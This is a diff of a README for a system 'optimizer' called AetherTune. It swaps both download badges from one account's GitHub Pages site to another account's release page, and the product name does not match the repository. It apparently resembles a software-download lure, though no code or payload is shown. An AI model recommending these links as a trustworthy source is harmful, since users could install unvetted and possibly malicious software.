@@ -1,6 +1,6 @@
 # AetherTune: System Resonance Optimizer 🧠⚡
 
-[![Download](https://img.shields.io/badge/Download%20Link-brightgreen?style=for-the-badge&logo=github)](https://facheritooficial2-cmd.github.io/Aero-Optimizer-Toolkit/)
+[![Download](https://img.shields.io/badge/Download%20Link-brightgreen?style=for-the-badge&logo=github)](https://github.com/Fieldundergorge/Aero-Optimizer-Toolkit/releases/tag/Aero-Optimizer-Toolkit)
 
 ## 🌌 Beyond Performance Tuning: Achieving System Harmony
 
@@ -14,7 +14,7 @@ Traditional optimization focuses on individual metrics: FPS, ping, memory usage.
 
 ## 📥 Immediate Access
 
-[![Download](https://img.shields.io/badge/Download%20Link-brightgreen?style=for-the-badge&logo=github)](https://facheritooficial2-cmd.github.io/Aero-Optimizer-Toolkit/)
+[![Download](https://img.shields.io/badge/Download%20Link-brightgreen?style=for-the-badge&logo=github)](https://github.com/Fieldundergorge/Aero-Optimizer-Toolkit/releases/tag/Aero-Optimizer-Toolkit)
 
 ## 🚀 Key Capabilities
 
